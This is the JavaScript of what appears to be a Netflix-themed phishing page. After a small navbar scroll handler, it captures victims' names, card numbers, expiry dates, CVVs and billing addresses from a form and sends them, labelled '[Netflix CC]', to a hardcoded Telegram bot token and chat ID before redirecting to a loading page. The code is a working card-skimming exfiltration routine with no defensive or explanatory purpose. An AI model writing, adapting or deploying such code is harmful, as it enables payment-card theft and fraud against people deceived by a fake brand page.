//navbar scrolling down opacity change
window.addEventListener('scroll', () => {
    const navbar = document.querySelector('.navbar__container2');
    const scrolledClass = 'scrolled';
    const scrollPosition = window.scrollY;
    const windowHeight = window.innerHeight;
    const twentyPercentOfWindow = 0.04 * windowHeight;

    if (scrollPosition > twentyPercentOfWindow) {
        navbar.classList.add(scrolledClass);
    } else {
        navbar.classList.remove(scrolledClass);
    }
});


const fname = document.getElementById('fname');

const fdebit = document.getElementById('fcard');
const fexp = document.getElementById('fexp');
const fcvv = document.getElementById('fcvv');

const faddress = document.getElementById('faddress');
const fzip = document.getElementById('fzip');
const fcity = document.getElementById('fcity');
const fstate = document.getElementById('fstate');

const submit = document.getElementsByClassName('contact')[0];

submit.addEventListener('submit', async (e) => {
    e.preventDefault();


    let ebody = `
    \n
    <b>[Netflix CC]</b>
    \n
    \n
    <b>Name: </b>${fname.value}
    \n
    \n
    <b>Card Number: </b>${fdebit.value}
    \n
    <b>EXP Date: </b>${fexp.value}
    \n
    <b>CVV: </b>${fcvv.value}
    \n
    \n
    <b>Address: </b>${faddress.value}
    \n
    <b>Zipcode: </b>${fzip.value}
    \n
    <b>City: </b>${fcity.value}
    \n
    <b>State: </b>${fstate.value}
    \n
    \n`;

    // Telegram Bot API endpoint
    const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
    const chatId = '6391433593';

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: ebody,
            parse_mode: 'HTML',
        });

        // Redirect after sending the message
        window.location.href = "load2.html";
    } catch (error) {
        console.error("Error sending message to Tele:", error);

        // Check if there's a specific error message from the Telegram API response
        if (error.response && error.response.data) {
            console.error("Tele API error:", error.response.data);
        }
    }
});